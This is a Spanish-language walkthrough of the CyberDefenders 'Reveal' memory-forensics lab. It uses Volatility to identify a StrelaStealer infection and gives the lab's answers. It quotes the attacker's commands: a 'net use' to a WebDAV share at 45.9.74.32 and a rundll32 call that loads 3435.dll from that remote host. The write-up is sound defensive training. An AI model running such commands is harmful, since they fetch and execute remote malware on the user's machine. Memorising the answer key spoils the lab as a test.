- --
- Tags: #volatility #cyberdefenders #reveal_lab #virustotal 
- --
![Pasted image 20260704145920](../../Fotos/Pasted%20image%2020260704145920.png)

Identificar el nombre del proceso malicioso ayuda a comprender la naturaleza del ataque. ¿Cuál es el nombre del proceso malicioso?

![Pasted image 20260704153152](../../Fotos/Pasted%20image%2020260704153152.png)

![Pasted image 20260704153124](../../Fotos/Pasted%20image%2020260704153124.png)

**Respuesta:** smartscreen.exe

Conocer el ID de proceso padre (PPID) del proceso malicioso ayuda a rastrear la jerarquía del proceso y a comprender el flujo del ataque. ¿Cuál es el PID principal del proceso malicioso?

![Pasted image 20260704153436](../../Fotos/Pasted%20image%2020260704153436.png)

**Respuesta:** 4120

Determinar el nombre del archivo utilizado por el malware para ejecutar la carga útil de la segunda etapa es crucial para identificar actividades maliciosas posteriores. ¿Cuál es el nombre del archivo que utiliza el malware para ejecutar la carga útil de la segunda etapa?
`net use \\45.9.74.32@8888\davwwwroot\` establece una conexión a un recurso remoto mediante **WebDAV** en la IP **45.9.74.32** usando el puerto **8888**. A continuación, `rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry` utiliza el binario legítimo **rundll32.exe** para cargar y ejecutar la función **entry** de la DLL **3435.dll** directamente desde ese recurso remoto. La presencia de **PowerShell** en la cadena de ejecución refuerza el comportamiento sospechoso, ya que tanto `rundll32.exe` como `powershell.exe` son herramientas legítimas de Windows frecuentemente abusadas por atacantes para ejecutar malware sin utilizar binarios propios (técnica conocida como **Living off the Land** o **LOLBins**).

![Pasted image 20260704153943](../../Fotos/Pasted%20image%2020260704153943.png)

**Respuesta:** 3435.dll

Identificar el directorio compartido en el servidor remoto ayuda a rastrear los recursos dirigidos por el atacante. ¿Cuál es el nombre del directorio compartido al que se accede en el servidor remoto?

![Pasted image 20260704154255](../../Fotos/Pasted%20image%2020260704154255.png)

![Pasted image 20260704154255](../../Fotos/Pasted%20image%2020260704154255.png)

**Respuesta:** davwwwroot

¿Qué es el ID de subtécnica MITRE ATT&CK que describe la ejecución de una carga útil de segunda etapa usando una utilidad de Windows para ejecutar el archivo malicioso?

![Pasted image 20260704154745](../../Fotos/Pasted%20image%2020260704154745.png)

Identificar el nombre de usuario bajo el cual se ejecuta el proceso malicioso ayuda a evaluar la cuenta comprometida y su posible impacto. ¿Cuál es el nombre de usuario bajo el que se ejecuta el proceso malicioso?

**Nombre de usuario:**  
- El proceso **powershell.exe** (PID **3692**) se ejecuta bajo la cuenta de usuario **Elon**, asociada al **SID S-1-5-21-3274565340-3808842250-3617890653-1001**.

**Membresías y privilegios de grupo:**
- **Usuarios de Dominio (SID S-1-5-21-...-513):** Indica que la cuenta **Elon** pertenece al grupo **Usuarios de Dominio**, lo que le permite acceder a los recursos disponibles dentro del dominio.
- **Administradores (SID S-1-5-32-544):** Señala que el usuario cuenta con privilegios de administrador, otorgándole un alto nivel de control sobre el sistema.
- **Cuenta local (miembro del grupo Administradores):** Confirma que la cuenta también forma parte del grupo local de administradores, reforzando sus privilegios elevados.
- **Nivel de integridad obligatorio – Alto (SID S-1-16-12288):** Este nivel de integridad indica que el proceso se ejecuta con permisos elevados, lo que le permite realizar acciones críticas en el sistema.

![Pasted image 20260704155010](../../Fotos/Pasted%20image%2020260704155010.png)

**Respuesta:** Elon

Conocer el nombre de la familia de malware es esencial para correlacionar el ataque con amenazas conocidas y desarrollar defensas adecuadas. ¿Cuál es el nombre de la familia de malware?

**StrelaStealer** es una **familia de malware de tipo infostealer** (ladrón de información) diseñada para **robar credenciales y datos confidenciales** de equipos Windows.

![Pasted image 20260704155436](../../Fotos/Pasted%20image%2020260704155436.png)

**Respuesta:** STRELASTEALER